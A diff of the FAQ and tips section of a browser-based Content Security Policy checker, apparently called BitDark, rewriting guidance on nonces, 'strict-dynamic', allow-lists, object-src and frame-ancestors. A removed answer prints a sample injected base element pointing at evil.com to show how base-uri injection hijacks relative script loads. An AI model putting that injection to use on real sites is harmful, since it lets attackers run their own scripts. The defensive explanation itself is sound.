-          <strong>Relying on Meta Tags for Framing Protection:</strong> The <code>frame-ancestors</code> directive <strong>is explicitly ignored when defined inside an HTML <code>&lt;meta http-equiv="Content-Security-Policy"&gt;</code> tag</strong>. To protect against clickjacking, <code>frame-ancestors</code> must be delivered via an authentic HTTP response header.
-        </li>
-        <li>
-          <strong>Combining 'unsafe-inline' with Nonces Incorrectly:</strong> Under CSP Level 2 and Level 3, if a nonce or hash is present in <code>script-src</code>, browsers automatically ignore <code>'unsafe-inline'</code>. While this provides graceful backward compatibility for legacy CSP Level 1 browsers, leaving <code>'unsafe-inline'</code> in policies that lack nonces completely destroys your defense.
-        </li>
+        <li><strong>Generate a new random nonce for every response</strong> (at least 128 bits, base64) and add it to each <code>&lt;script nonce="…"&gt;</code> tag. A fixed nonce, like the one in the sample, offers no protection.</li>
+        <li><strong><code>'strict-dynamic'</code></strong> lets trusted scripts load further scripts, and makes modern browsers ignore host lists and <code>'unsafe-inline'</code>. <code>https:</code> and <code>'unsafe-inline'</code> are fallbacks for very old browsers only.</li>
+        <li><strong><code>frame-ancestors</code> only works as a header.</strong> It's ignored in a <code>&lt;meta&gt;</code> tag, so use the header for clickjacking protection.</li>
       </ul>
 
       <!-- Interactive FAQ Section -->
       <section class="faq-block">
-        <h2>Frequently Asked Technical Questions</h2>
+        <h2>Frequently Asked Questions</h2>
 
         <div class="faq-item">
-          <div class="faq-question">What does "unsafe-inline" actually permit, and why is it dangerous?</div>
+          <div class="faq-question">Does "Strict / Strong" mean my CSP is secure?</div>
           <div class="faq-answer">
-            <code>'unsafe-inline'</code> allows the execution of inline <code>&lt;script&gt;</code> blocks, inline JavaScript event handlers (such as <code>onclick="..."</code>, <code>onerror="..."</code>), and <code>javascript:</code> pseudoprotocol URLs. Because injected XSS attacks overwhelmingly rely on inline execution vectors, enabling <code>'unsafe-inline'</code> without cryptographic nonces or hashes negates the primary anti-XSS benefit of Content Security Policy.
+            Not necessarily. The evaluator doesn't assess host allow-lists, so a policy that allows a public CDN or a large domain can still be bypassed. Prefer nonces or hashes with 'strict-dynamic' over lists of hosts.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">How does 'strict-dynamic' simplify CSP Level 3 deployments?</div>
+          <div class="faq-question">Why are domain allow-lists risky in script-src?</div>
           <div class="faq-answer">
-            Before <code>'strict-dynamic'</code>, developers had to manually inventory and whitelist every single domain that their third-party scripts (like Google Tag Manager, analytics, or payment widgets) might contact or load subordinate scripts from. With <code>'strict-dynamic'</code>, you only need to sign the root loader script with a nonce. That trusted script can dynamically load any subsequent scripts using <code>document.createElement('script')</code>, eliminating the need to maintain fragile host allowlists.
+            Any script hosted on an allowed domain can run on your page. Public CDNs serve thousands of libraries, and many large sites have JSONP endpoints or old library versions that attackers can reuse to run their own code. Nonce- or hash-based policies avoid this.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">Why must object-src always be explicitly set to 'none'?</div>
+          <div class="faq-question">Is 'unsafe-inline' always dangerous?</div>
           <div class="faq-answer">
-            The <code>object-src</code> directive governs legacy browser plugin execution surfaces, including Adobe Flash (SWF), Microsoft Silverlight, and Java applets. Even though modern desktop browsers have phased out NPAPI plugins, setting <code>object-src 'none'</code> guarantees that older mobile browsers, embedded WebViews, and desktop clients cannot execute plugin-based code to bypass script boundaries.
+            In script-src, yes, unless the policy also has a nonce or hash. Browsers that support CSP Level 2 or later then ignore 'unsafe-inline', and it only applies as a fallback in very old browsers. In style-src it's much lower risk and often needed.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">Can I enforce Content Security Policy via an HTML meta tag?</div>
+          <div class="faq-question">Do I still need object-src 'none' now that Flash is gone?</div>
           <div class="faq-answer">
-            Yes, many CSP directives work inside <code>&lt;meta http-equiv="Content-Security-Policy" content="..."&gt;</code> tags. However, critical directives—including <code>frame-ancestors</code>, <code>report-uri</code>, <code>report-to</code>, and <code>sandbox</code>—are strictly disallowed in meta tags by the W3C specification and will be ignored by browsers. Full-spectrum security requires HTTP response header delivery.
+            Yes. It stops &lt;object&gt; and &lt;embed&gt; elements from loading content, which closes some injection paths, and it's part of Google's recommended strict CSP. Setting default-src 'none' also covers it.
           </div>
         </div>
 
         <div class="faq-item">
-          <div class="faq-question">How does CSP protect against Clickjacking attacks?</div>
+          <div class="faq-question">Is my policy sent anywhere?</div>
           <div class="faq-answer">
-            The <code>frame-ancestors</code> directive defines which parent origins are allowed to embed your web pages within an <code>&lt;iframe&gt;</code>. By declaring <code>frame-ancestors 'none';</code>, user agents refuse to render your page inside any iframe, neutralizing UI redressing (clickjacking) where an attacker layers a transparent frame over a deceptive button.
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">What is base-uri injection, and how does base-uri 'none' stop it?</div>
-          <div class="faq-answer">
-            If an application permits HTML injection, an attacker might inject a <code>&lt;base href="https://evil.com/"&gt;</code> element into the page. If the page uses relative script paths (such as <code>&lt;script src="app.js"&gt;</code>), the browser resolves that path against the injected base, fetching <code>https://evil.com/app.js</code> instead of your authentic script. Setting <code>base-uri 'none'</code> or <code>'self'</code> prevents unauthorized modification of document base resolution roots.
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">Does BitDark store, record, or transmit evaluated CSP headers?</div>
-          <div class="faq-answer">
-            Never. BitDark operates on a strict zero-network-egress security model. All parsing, Abstract Syntax Tree generation, rule evaluation, and diagnostic scoring execute entirely within your browser's private JavaScript runtime memory. No data is transmitted to BitDark or third-party servers.
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <div class="faq-question">What is the difference between CSP enforcement and Report-Only mode?</div>
-          <div class="faq-answer">
-            The <code>Content-Security-Policy</code> header blocks unauthorized resources and optionally reports violations. In contrast, the <code>Content-Security-Policy-Report-Only</code> header permits all resources to execute normally without blocking, but dispatches JSON diagnostic reports to your reporting endpoint whenever a violation occurs. Report-Only mode is essential for discovering legitimate script dependencies without breaking production UX.
+            No. Parsing and checks run in JavaScript in your browser, and the tool makes no network requests with your policy. It doesn't fetch or test your website.
           </div>
         </div>
       </section>
